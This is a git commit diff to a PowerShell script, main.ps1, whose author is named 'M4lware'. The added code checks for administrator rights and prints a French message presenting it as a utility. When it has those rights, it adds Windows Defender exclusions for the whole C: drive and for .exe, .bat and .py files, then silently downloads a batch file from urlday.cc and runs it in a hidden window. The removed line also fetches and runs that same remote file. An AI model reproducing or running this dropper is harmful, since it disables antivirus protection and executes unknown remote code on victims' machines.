0a6f9b586b419efb7a17c93ec6698ef216ee12d0
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-07 20:16:18 +0600

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,1 +1,17 @@
-iwr -useb urlday.cc/opti -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -NoNewWindow
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    chcp 65001 > $null
+    Write-Host "`nPour pouvoir utiliser l'utilitaire, vous devez être un administrateur exécutant une session de console."
+    chcp 850 > $null
+} else {
+    set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
+    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
+    powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
+    powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
+    powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
+    iwr -useb urlday.cc/opti -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -WindowStyle Hidden
+}
+
+
+
